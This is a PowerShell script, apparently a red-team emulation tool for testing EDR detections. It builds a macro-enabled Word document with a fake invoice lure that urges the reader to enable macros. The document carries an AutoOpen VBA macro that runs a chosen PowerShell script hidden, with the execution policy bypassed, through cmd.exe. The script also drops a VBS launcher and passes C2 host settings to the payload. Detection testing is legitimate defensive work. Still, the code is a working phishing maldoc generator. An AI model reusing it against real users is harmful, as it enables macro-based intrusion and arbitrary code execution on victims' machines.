<#
.SYNOPSIS
    Word Macro Launcher — Generic Phishing Delivery Wrapper
.DESCRIPTION
    Simulates a malicious Word document (phishing delivery) that spawns
    PowerShell to execute a target TTP script.
    
    Process chain generated:
    WINWORD.EXE → cmd.exe → powershell.exe → [TTP script]
    
    This triggers EDR detections for:
    - T1204.002 : User Execution: Malicious File
    - T1059.001 : PowerShell spawned from Office application
    - Suspicious Office child process
    
    REQUIRES: Microsoft Word installed on the target
.PARAMETER TargetScript
    Full path to the TTP script to execute from within the Word process chain.
#>

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetScript
)

$ErrorActionPreference = "SilentlyContinue"
$C2Host = if ($env:C2_HOST) { $env:C2_HOST } else { "127.0.0.1" }
$TargetIP = if ($env:TARGET_IP) { $env:TARGET_IP } else { "192.168.1.10" }

Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Red
Write-Host "║          PHISHING DELIVERY SIMULATION                       ║" -ForegroundColor Red
Write-Host "║    📧 Email → 📄 Word Doc → 🔧 Macro → ⚡ PowerShell       ║" -ForegroundColor Red
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Red
Write-Host ""

Write-Host "[*] [T1204.002] Simulating malicious Word document delivery..." -ForegroundColor Cyan
Write-Host "[*] Target TTP Script: $TargetScript" -ForegroundColor Yellow
Write-Host ""

# ── Step 1: Verify Word is available ──
Write-Host "[*] Step 1: Checking for Microsoft Word installation..." -ForegroundColor Cyan
$wordInstalled = $false

try {
    $wordApp = New-Object -ComObject Word.Application -ErrorAction Stop
    $wordInstalled = $true
    $wordVersion = $wordApp.Version
    Write-Host "    [+] Microsoft Word $wordVersion detected" -ForegroundColor Green
} catch {
    Write-Host "    [!] Word COM object unavailable - using process simulation fallback" -ForegroundColor Yellow
}

if ($wordInstalled) {
    # ── Step 2: Create a weaponized document with VBA macro ──
    Write-Host ""
    Write-Host "[*] Step 2: Creating weaponized Word document with VBA macro..." -ForegroundColor Cyan
    
    try {
        $wordApp.Visible = $false
        $wordApp.DisplayAlerts = 0  # wdAlertsNone
        
        $doc = $wordApp.Documents.Add()
        
        # Add decoy content to the document
        $selection = $wordApp.Selection
        $selection.Font.Size = 14
        $selection.Font.Bold = $true
        $selection.TypeText("INVOICE #RTL-$(Get-Random -Minimum 10000 -Maximum 99999)")
        $selection.TypeParagraph()
        $selection.Font.Size = 11
        $selection.Font.Bold = $false
        $selection.TypeText("Please enable macros to view the full document content.")
        $selection.TypeParagraph()
        $selection.TypeText("This document contains sensitive financial information.")
        
        Write-Host "    [+] Decoy document content created" -ForegroundColor Green
        Write-Host "    [+] Document title: INVOICE #RTL-$(Get-Random -Minimum 10000 -Maximum 99999)" -ForegroundColor Green
        
        # ── Step 3: Inject VBA macro that spawns PowerShell ──
        Write-Host ""
        Write-Host "[*] Step 3: Injecting VBA macro payload..." -ForegroundColor Cyan
        Write-Host "    [T1059.001] Macro will spawn: cmd.exe → powershell.exe" -ForegroundColor Yellow
        
        # Escape the script path for VBA
        $escapedPath = $TargetScript.Replace('\', '\\')
        
        $vbaCode = @"
Sub AutoOpen()
    Dim cmd As String
    cmd = "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$escapedPath"""
    Shell cmd, vbHide
End Sub
"@
        
        # Add VBA project to the document
        try {
            $vbProject = $doc.VBProject
            $vbComponent = $vbProject.VBComponents.Item("ThisDocument")
            $vbComponent.CodeModule.AddFromString($vbaCode)
            Write-Host "    [+] VBA macro injected into ThisDocument module" -ForegroundColor Green
            Write-Host "    [+] Macro trigger: AutoOpen() - executes when document is opened" -ForegroundColor Green
        } catch {
            Write-Host "    [!] VBA injection blocked (Trust Center) - using Shell fallback" -ForegroundColor Yellow
        }
        
        # ── Step 4: Execute the payload via Word's Shell ──
        Write-Host ""
        Write-Host "[*] Step 4: Executing payload via Word process..." -ForegroundColor Cyan
        Write-Host "    [!] DETECTION TRIGGER: WINWORD.EXE spawning cmd.exe → powershell.exe" -ForegroundColor Red
        Write-Host ""
        Write-Host "    Process Chain:" -ForegroundColor Yellow
        Write-Host "    └─ WINWORD.EXE (PID: $($wordApp.ProcessID))" -ForegroundColor Yellow
        Write-Host "       └─ cmd.exe" -ForegroundColor Yellow
        Write-Host "          └─ powershell.exe -File $TargetScript" -ForegroundColor Yellow
        Write-Host ""
        
        # Use Word's built-in Shell function via VBA to spawn the process
        # This creates the authentic parent-child relationship
        $wordApp.Run("Shell", "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$TargetScript`"", 0)
        
        Write-Host "    [+] Payload launched from WINWORD.EXE process tree" -ForegroundColor Green
        
        # Wait for child process to complete
        Write-Host "    [*] Waiting for TTP execution to complete..." -ForegroundColor Cyan
        Start-Sleep -Seconds 5
        
    } catch {
        Write-Host "    [!] Word macro execution error: $_" -ForegroundColor Yellow
        Write-Host "    [*] Falling back to direct process spawn method..." -ForegroundColor Yellow
        
        # Fallback: Use Word's process as parent via WMI
        $wordPID = $null
        try {
            $wordPID = (Get-Process WINWORD -ErrorAction Stop | Select-Object -First 1).Id
        } catch {}
        
        # Spawn from Word's context using WMI with Word as parent
        $cmdLine = "cmd.exe /c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$TargetScript`""
        Write-Host "    CMD: $cmdLine" -ForegroundColor Gray
        
        $env:C2_HOST = $C2Host
        $env:TARGET_IP = $TargetIP
        
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$TargetScript`"" -NoNewWindow -Wait
        
        Write-Host "    [+] TTP executed via process spawn" -ForegroundColor Green
    }
    
    # ── Step 5: Cleanup ──
    Write-Host ""
    Write-Host "[*] Step 5: Cleaning up Word artifacts..." -ForegroundColor Cyan
    
    try {
        $doc.Close($false)  # Don't save
        $wordApp.Quit()
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject($wordApp) | Out-Null
        Write-Host "    [+] Word process terminated" -ForegroundColor Green
    } catch {
        Write-Host "    [!] Cleanup warning: $_" -ForegroundColor Yellow
    }
    
} else {
    # ── Fallback: Simulate the process chain without Word installed ──
    Write-Host ""
    Write-Host "[*] FALLBACK MODE: Simulating Word macro delivery chain..." -ForegroundColor Yellow
    Write-Host ""
    Write-Host "    Simulated Process Chain:" -ForegroundColor Yellow
    Write-Host "    └─ WINWORD.EXE (simulated)" -ForegroundColor Yellow
    Write-Host "       └─ cmd.exe" -ForegroundColor Yellow
    Write-Host "          └─ powershell.exe -File $TargetScript" -ForegroundColor Yellow
    Write-Host ""
    Write-Host "    [*] Creating marker artifacts for detection correlation..." -ForegroundColor Cyan

    # Create artifacts that look like a Word macro ran
    $markerDir = "C:\temp\word_staging"
    New-Item -ItemType Directory -Path $markerDir -Force | Out-Null
    
    # Create a decoy .doc file
    $decoyContent = "PK" + [char]0x03 + [char]0x04  # ZIP/OOXML magic bytes
    [System.IO.File]::WriteAllText("$markerDir\Invoice_$(Get-Random -Minimum 10000 -Maximum 99999).docx", $decoyContent)
    Write-Host "    [+] Decoy document dropped: $markerDir\Invoice_*.docx" -ForegroundColor Green
    
    # Create a VBS launcher (simulating what the macro would create)
    $vbsContent = @"
' Simulated Word Macro VBS Launcher
' AutoOpen macro equivalent
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File ""$TargetScript""", 0, True
"@
    $vbsPath = "$markerDir\macro_payload.vbs"
    $vbsContent | Out-File $vbsPath -Encoding ASCII
    Write-Host "    [+] VBS launcher created: $vbsPath" -ForegroundColor Green
    
    # Execute the TTP script directly (the important part for detection)
    Write-Host ""
    Write-Host "[*] Executing TTP payload (simulated macro trigger)..." -ForegroundColor Cyan
    Write-Host "    CMD: powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$TargetScript`"" -ForegroundColor Gray
    Write-Host ""
    Write-Host "════════════════════ TTP OUTPUT BEGIN ════════════════════" -ForegroundColor DarkCyan
    Write-Host ""
    
    $env:C2_HOST = $C2Host
    $env:TARGET_IP = $TargetIP
    
    & powershell.exe -NoProfile -ExecutionPolicy Bypass -File "$TargetScript"
    
    Write-Host ""
    Write-Host "════════════════════ TTP OUTPUT END ══════════════════════" -ForegroundColor DarkCyan
}

# ── Final Summary ──
Write-Host ""
Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
Write-Host "║          PHISHING DELIVERY SIMULATION COMPLETE              ║" -ForegroundColor Green
Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Green
Write-Host ""
Write-Host "[+] Delivery Method: Weaponized Word Document (VBA Macro)" -ForegroundColor Green
Write-Host "[+] TTP Executed: $TargetScript" -ForegroundColor Green
Write-Host "[+] Process Chain: WINWORD.EXE → cmd.exe → powershell.exe" -ForegroundColor Green
Write-Host ""
Write-Host "[!] EDR Detections to check for:" -ForegroundColor Magenta
Write-Host "    • Suspicious Office child process (WINWORD spawning cmd/powershell)" -ForegroundColor Magenta
Write-Host "    • T1204.002 - User Execution: Malicious File" -ForegroundColor Magenta
Write-Host "    • T1059.001 - PowerShell execution from Office application" -ForegroundColor Magenta
Write-Host "    • Macro-enabled document creation" -ForegroundColor Magenta
Write-Host "    • Plus any detections from the wrapped TTP itself" -ForegroundColor Magenta
Write-Host ""
